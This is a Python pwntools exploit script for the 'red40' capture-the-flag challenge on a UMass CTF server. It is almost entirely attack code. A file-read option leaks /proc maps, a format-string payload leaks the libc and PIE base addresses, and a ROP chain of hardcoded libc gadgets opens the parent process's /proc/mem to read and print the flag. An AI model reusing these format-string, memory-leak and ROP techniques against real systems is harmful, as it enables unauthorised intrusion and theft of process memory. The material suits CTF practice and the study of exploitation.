#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=0.0.0.0' '--port=1000' red40
from os import O_RDONLY, O_WRONLY
from pwn import *
import ctypes

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'source/red40')

# Load the C standard library
libc = ELF("source/libc/libc.so.6")  # Assuming you are using a Unix-like system, adjust accordingly for Windows

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'red40.ctf.umasscybersec.org'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# b *warn_get+120
b *warn_get+157
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./libc'

def check_rand():
    while True:
        rand = libc.rand() % (41) == 40
        return rand


def gamble():
    while True:    
        io.sendline(b"Y")
        if b"YOU LOST" in io.recvuntil(b"> "):
            return gamble()
            

        io.sendline(b"1")
        io.recvuntil(b"You are now appreciating your ")
        recv = int(io.recvline().split(b"RED40")[0].strip())
        return recv

def get_parentpid():
    io.sendlineafter(b"> ", b"2")
    io.recvuntil(b"> ")
    p_pid = gamble()   
    log.success(f"PPID @ {p_pid}")
    return p_pid

def steal(file):
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b'>', file)
    io.recvline()
    leak = io.recvuntil(b"You have stolen a lot of red40...")
    return leak

def warn():
    libc_offset = 21
    exe_offset = 23
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b">\n", f"%{libc_offset}$p%{exe_offset}$p".encode())
    recv = io.recvline()
    log.info(recv)

    libc_address = int(recv[:14],16) - 0x29d90
    log.success(f"libc_base => {hex(libc_address)}")
    exe_address = int(recv[14:],16) - exe.sym["main"]
    log.success(f"pie_base => {hex(exe_address)}")
    return libc_address, exe_address



def leak_from_maps(maps, file):
    for line in maps.splitlines():
        if file in line:
            file_base = int(line.split(b"-")[0], 16)
            log.success(f"{file} base @ {hex(file_base)}")

            return file_base


io = start(["loop"])

p_pid = get_parentpid()
maps = steal(f"/proc/{p_pid}/maps".encode())
heap_base = leak_from_maps(maps, b"heap")
flag = heap_base+0x2A0 #tcache_perthread_struct + header chunk

libc.address, exe.address = warn()
write_addr = libc.address + 0x021c000

p = cyclic(56)

rop = ROP(libc)

pop_rsi                = libc.address+0x000000000002be51 # pop rsi ; ret
pop_rdi                = libc.address+0x000000000002a3e5 # pop rdi ; ret
pop_rdx                = libc.address+0x0000000000170337
mov_prsi_rdx           = libc.address+0x000000000005652a # mov qword ptr [rsi], rdx ; ret
mov_prsi_rdi           = libc.address+0x0000000000141c51 # mov qword ptr [rsi], rdi ; ret
pop_rax_pop_rdx_pop_rbx= libc.address+0x00000000000904a8 # pop rax ; pop rdx ; pop rbx ; ret
ret                    = libc.address+0x0000000000029139 # ret
p+= p64(pop_rsi) + p64(write_addr)   
p+= p64(pop_rdi) + b"/proc/".ljust(8, b"\x00") + p64(mov_prsi_rdi)

p+= p64(pop_rsi) + p64(write_addr+len(b"/proc/")) 
p+= p64(pop_rdi) + f"{p_pid}".encode().ljust(8, b"\x00") + p64(mov_prsi_rdi)

p+= p64(pop_rsi) + p64(write_addr+len(f"/proc/{p_pid}".encode()))
p+= p64(pop_rdi) + b"/mem".ljust(8, b"\x00") + p64(mov_prsi_rdi)

rop.call("open", (write_addr, O_RDONLY, 0))
rop.call("lseek", (5, flag, 0))            
rop.call("read", (5, write_addr, 0x30))    

p+=rop.chain()
p+= p64(pop_rdi) + p64(write_addr) 
p+= p64(libc.sym["printf"])
# p+= p64(pop_rdi) + p64(write_addr) 
# p+= p64(libc.sym["puts"]) # It works too!

print(rop.dump())
io.sendlineafter(b"> ", p)
io.interactive()
log.success(re.search(b'UMASS{.+}', io.recvall()))

